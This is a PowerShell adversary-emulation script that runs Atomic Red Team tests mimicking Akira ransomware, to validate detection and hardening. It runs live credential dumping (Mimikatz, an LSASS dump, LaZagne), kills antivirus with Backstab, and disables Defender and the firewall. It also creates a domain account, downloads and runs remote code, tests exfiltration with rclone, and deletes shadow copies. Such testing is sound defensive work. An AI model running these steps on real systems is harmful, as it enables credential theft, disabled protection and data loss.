# Akira Ransomware Atomic Simulation
# Author : Sebastian Kandler (@skandler)
# Date : 01/07/2024
# Simulate Akira Ransomware tactics, techniques, and procedures (TTP) with atomic red team and some own tests to validate security controls
#
# Recommend to run it also without pattern based malware protection, to verify EDR behaviour based detections, otherwise pattern based AV will block most of the tools. An attacker who does obfuscation of these attack tools, wont be detected by pattern based av.
# Expect that attackers will turn off your EDR Solution like in steps 22-24, how do you detect and protect without EDR? running it without EDR will also test your system hardening settings like Windows Credential Dump Hardening settings like LSA Protect or Credential guard. 
#
# Prerequisite: https://github.com/redcanaryco/invoke-atomicredteam - works best with powershell 7
#
#
# see detailled descriptions of tests at github readme files for atomics for example for T1003: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md
#
# References
# https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a
# https://detect.fyi/akira-in-the-chang-way-server-ecosystem-re-vicitimization-a9011fbc6dff
# https://www.trendmicro.com/vinfo/tr/security/news/ransomware-spotlight/ransomware-spotlight-akira
#
#

Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}

# Atomic Test #1 - T1482 - Windows - Discover domain trusts with nltest
Invoke-AtomicTest T1482 -TestNumbers 2

# Atomic Test #2 - T1069.001 - Basic Permission Groups Discovery Windows (Local)
Invoke-AtomicTest T1069.001 -TestNumbers 2

# Atomic Test #3 - T1069.002 - Basic Permission Groups Discovery Windows (Domain)
Invoke-AtomicTest T1069.002 -TestNumbers 1

# Atomic Test #4 - T1018 - Remote System Discovery with nltest
Invoke-AtomicTest T1018 -TestNumbers 3

# Atomic Test #5 -T1057 - Process Discovery with tasklist
Invoke-AtomicTest T1057 -TestNumbers 2

# Atomic Test #6 T1482 - Domain Trust Discovery
Invoke-AtomicTest T1482 -TestNumbers 4 -GetPrereqs
Invoke-AtomicTest T1482 -TestNumbers 4 
Invoke-AtomicTest T1482 -TestNumbers 5

# Atomic Test #7 T1046 - Network Service Discovery (advanced ip scanner)
echo "# Atomic Test #7 T1046 - Network Service Discovery (advanced ip scanner)"
Invoke-WebRequest -Uri "https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe" -OutFile "C:\temp\Advanced_IP_Scanner_2.5.4594.1.exe"
C:\temp\Advanced_IP_Scanner_2.5.4594.1.exe /SP- /VERYSILENT
cmd.exe /c "C:\Program Files (x86)\Advanced IP Scanner\advanced_ip_scanner_console.exe" "/r:10.10.10.1-10.10.10.255"

# Atomic Test #8 T1016 - System Network Configuration Discovery on Windows
Invoke-AtomicTest T1016 -TestNumbers 1

# Atomic Test #9 - T1003.001 - Offline Credential Theft With Mimikatz
Invoke-AtomicTest T1003.001 -TestNumber 6 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumber 6

# Atomic Test #10 - T1003.001 - Dump LSASS.exe Memory using ProcDump
Invoke-AtomicTest T1003.001 -TestNumber 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumber 1

# Atomic Test 11 - T1555.003 - Dump Credentials using Lazagne
Invoke-AtomicTest T1555.003 -TestNumber 9 -GetPrereqs
Invoke-AtomicTest T1555.003 -TestNumber 9

# Atomic Test 12 - T1555.003 - Dump Credentials using esentutl.exe from Chrome 
Invoke-AtomicTest T1555.003 -TestNumber 17 -GetPrereqs
Invoke-AtomicTest T1555.003 -TestNumber 17

# Atomic Test #13 - T1003.005 - Cached Credential Dump via Cmdkey
Invoke-AtomicTest T1003.005

# Atomic Test #14 - T1547.009 - Create shortcut to cmd in startup folders
Invoke-AtomicTest T1547.009 -TestNumbers 2

# Atomic Test #15 - T1053.005 - Scheduled Task Startup Script
Invoke-AtomicTest T1053.005 -TestNumbers 1

# Atomic Test #16 - T1548.002 - WinPwn - UAC Bypass ccmstp technique
Invoke-AtomicTest T1548.002 -TestNumbers 19

# Atomic Test #17 - T1558.003 - Rubeus kerberoast
Invoke-AtomicTest T1558.003 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1558.003 -TestNumbers 2

# Atomic Test #18 - T1134.001 - SeDebugPrivilege token duplication
Invoke-AtomicTest T1134.001 -TestNumbers 2

# Atomic Test #19 - T1021.002 - Copy and Execute File with PsExec
Invoke-AtomicTest T1021.002 -TestNumbers 3 -GetPrereqs
Invoke-AtomicTest T1021.002 -TestNumbers 3

# Atomic Test #20 T1136.002 - Create Account: Domain Account - Username itadm
net user itadm "T1136_pass123!" /add /domain
Invoke-AtomicTest T1136.002 -TestNumbers 1

# Atomic Test #21 T1136.002 - Create Account: Domain Account - Powershell
Invoke-AtomicTest T1136.002 -TestNumbers 3

# Atomic Test #22 T1562.001 - Impair Defenses: Disable or Modify Tools - Akira threat actors use BYOVD attacks to disable antivirus software.
Invoke-AtomicTest T1562.001 -TestNumbers 29 -GetPrereqs # Kill antimalware protected processes using Backstab
Invoke-AtomicTest T1562.001 -TestNumbers 29 #Kill antimalware protected processes using Backstab

# Atomic Test #23 T1562.001 - Impair Defenses: Disable or Modify Tools - disable defender
Invoke-AtomicTest T1562.001 -TestNumbers 16 #passt nicht ganz - defender Disable
Invoke-AtomicTest T1562.001 -TestNumbers 18 #passt nicht ganz - defender Disable
Invoke-AtomicTest T1562.001 -TestNumbers 27 #disable defender with dism

# Atomic Test #24 - T1562.004 - Disable Microsoft Defender Firewall via Registry
Invoke-AtomicTest T1562.004 -TestNumbers 2

# Atomic Test #25 - T1219 - Remote Access Software - AnyDesk Files Detected Test on Windows
Invoke-AtomicTest T1219 -TestNumbers 2

# Test #26 - T1090 - ngrok Proxy Service
echo "# Test #26 - T1090 - ngrok Proxy Service"
ping -n 1 tunnel.ngrok.com
tnc tunnel.ngrok.com -port 443

# Atomic Test #27 T1560.001 - Archive Collected Data: Archive via Utility - with Win-rar and password protected
Invoke-AtomicTest T1560.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1560.001 -TestNumbers 1
Invoke-AtomicTest T1560.001 -TestNumbers 2

# Atomic Test #28 T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone
Invoke-AtomicTest T1048.003 -TestNumbers 7 -GetPrereqs
Invoke-AtomicTest T1048.003 -TestNumbers 7

# Atomic Test #29 - T1567.002 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
Invoke-AtomicTest T1567.002 -GetPrereqs
Invoke-AtomicTest T1567.002 

# Atomic Test #30 - T1486 - PureLocker Ransom Note
Invoke-AtomicTest T1486 -TestNumbers 5

# Test 31 - T1486 - Add Files with .akira File Ending + Akira Ransomnote
echo "# Test 31 - T1486 - Add 100 Files with .akira File Ending + Akira Ransomnote"
1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("c:\test.$_.akira", $out) }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skandler/simulate-akira/main/akira_readme.txt" -OutFile "C:\akira_readme.txt"

# Atomic Test #32 - T1490 - Windows - Delete Volume Shadow Copies with Powershell
Invoke-AtomicTest T1490 -TestNumbers 5

